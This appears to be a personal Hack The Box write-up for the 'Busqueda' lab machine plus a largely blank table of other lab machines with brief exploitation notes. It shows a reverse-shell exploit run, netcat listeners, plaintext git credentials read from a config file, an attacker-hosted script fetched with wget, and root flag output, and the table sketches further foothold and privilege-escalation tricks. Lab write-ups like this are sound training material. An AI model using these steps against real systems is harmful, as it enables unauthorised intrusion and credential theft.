
## Busqueda 

1. Rustscan and Nmap
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

nmap -p$(cat busqueda-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 10.10.11.208
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-06 23:14 EST
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
```

2. Searcher 2.4.0 exploit
```
┌──(kali㉿kali)-[~/OSCP/htb]
└─$ ./exploit.sh searcher.htb 10.10.16.5 8888
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.16.5:8888
[*] Run the Reverse Shell... Press Ctrl+C after successful connection

┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nc -lvnp 8888
svc@busqueda:/dev/shm$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
svc@busqueda:/dev/shm$ 
```

3. Found cody git credentials
```
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

4. Found git administrator credentials and use it login and found script which require file to be full-checkup.sh . 

5. Created reverse shell and execute. 
```
svc@busqueda:/dev/shm$ wget http://10.10.16.5/full-checkup.sh
wget http://10.10.16.5/full-checkup.sh
--2024-03-07 06:55:17--  http://10.10.16.5/full-checkup.sh
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 59 [text/x-sh]
Saving to: ‘full-checkup.sh’

     0K                                                       100% 6.25M=0s

2024-03-07 06:55:17 (6.25 MB/s) - ‘full-checkup.sh’ saved [59/59]

svc@busqueda:/dev/shm$ chmod 777 full-checkup.sh
chmod 777 full-checkup.sh
svc@busqueda:/dev/shm$ 
```

6. Obtained root as reverse shell and flag. 
```
┌──(kali㉿kali)-[~/OSCP/htb/CVE-2022-0847-DirtyPipe-Exploits]
└─$ nc -nvlp 8889                  
listening on [any] 8889 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.208] 33142
root@busqueda:/dev/shm# cd 
cd 
root@busqueda:~# ls
ls
ecosystem.config.js
root.txt
scripts
snap
root@busqueda:~# cat root.txt
cat root.txt
d64451a40ec5b932753239254ed83491
```


| Machine Names | Exploitation way                                                                                                                                                                                                                                                                                                                                                                |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Lame          | NA                                                                                                                                                                                                                                                                                                                                                                              |
| Nibbles       | 1. nibbleblog sub-directory, <br>2. found version 4.0.3 at /nibbleblog/admin/boot/rules/98-constants.bit, <br>3. from trial and error methods found defautl pass 'admin:nibbles', <br>4. logged in and upload php cmd reverse image file with GIF8; header, <br>5. rm f reverse shell give foothold, <br>6. use monitor.sh for root or rationalove kernel exploit.              |
| Solidstate    | 1. Full nmap scan, port 4555 give foothold , <br>2. use nc listener on that port and ip, <br>3. set new password for the user mindy, <br>4. use thunderbird to get welcome email and password, <br>5. ssh login with mendy password, found corn file /opt/tmp.py, <br>6. give SUID permission to dash, helps to privesc.<br>Another way to foothold: james server 2.3.2 exploit |
| Poison        | Port 80 web page,found pwdbackup.txt, 13 time base 64 give password, port forward, rooted with remote code execution                                                                                                                                                                                                                                                            |
| Knife         | Port 80 web page, php 8.1.0-dev remote code execution, knife SUID                                                                                                                                                                                                                                                                                                               |
| Sunday        |                                                                                                                                                                                                                                                                                                                                                                                 |
| Keeper        |                                                                                                                                                                                                                                                                                                                                                                                 |
| Pilgrimage    |                                                                                                                                                                                                                                                                                                                                                                                 |
| Cozyhosting   |                                                                                                                                                                                                                                                                                                                                                                                 |
| Codify        |                                                                                                                                                                                                                                                                                                                                                                                 |
| Tartarsacue   |                                                                                                                                                                                                                                                                                                                                                                                 |
| Jarvis        |                                                                                                                                                                                                                                                                                                                                                                                 |
| Tabby         |                                                                                                                                                                                                                                                                                                                                                                                 |
| Falafel       |                                                                                                                                                                                                                                                                                                                                                                                 |
| Mentor        |                                                                                                                                                                                                                                                                                                                                                                                 |
| Deevvortex    |                                                                                                                                                                                                                                                                                                                                                                                 |
| lrked         |                                                                                                                                                                                                                                                                                                                                                                                 |
| popcorn       |                                                                                                                                                                                                                                                                                                                                                                                 |
| Borker        |                                                                                                                                                                                                                                                                                                                                                                                 |
| Analytics     |                                                                                                                                                                                                                                                                                                                                                                                 |
| Networed      |                                                                                                                                                                                                                                                                                                                                                                                 |
| Updown        | Very hard and difficult. Need to figure out code execution and check disabled php functions and figure out it.                                                                                                                                                                                                                                                                  |
| Swagshop      |                                                                                                                                                                                                                                                                                                                                                                                 |
| Nineveh       |                                                                                                                                                                                                                                                                                                                                                                                 |
| Pandora       |                                                                                                                                                                                                                                                                                                                                                                                 |
| OpenAdmin     |                                                                                                                                                                                                                                                                                                                                                                                 |
| Precious      |                                                                                                                                                                                                                                                                                                                                                                                 |
| Busqueda      |                                                                                                                                                                                                                                                                                                                                                                                 |
| Monitored     |                                                                                                                                                                                                                                                                                                                                                                                 |
| Sau           |                                                                                                                                                                                                                                                                                                                                                                                 |
| Broker        |                                                                                                                                                                                                                                                                                                                                                                                 |
| Intentions    |                                                                                                                                                                                                                                                                                                                                                                                 |
| Monitored     |                                                                                                                                                                                                                                                                                                                                                                                 |
| Soccer        |                                                                                                                                                                                                                                                                                                                                                                                 |



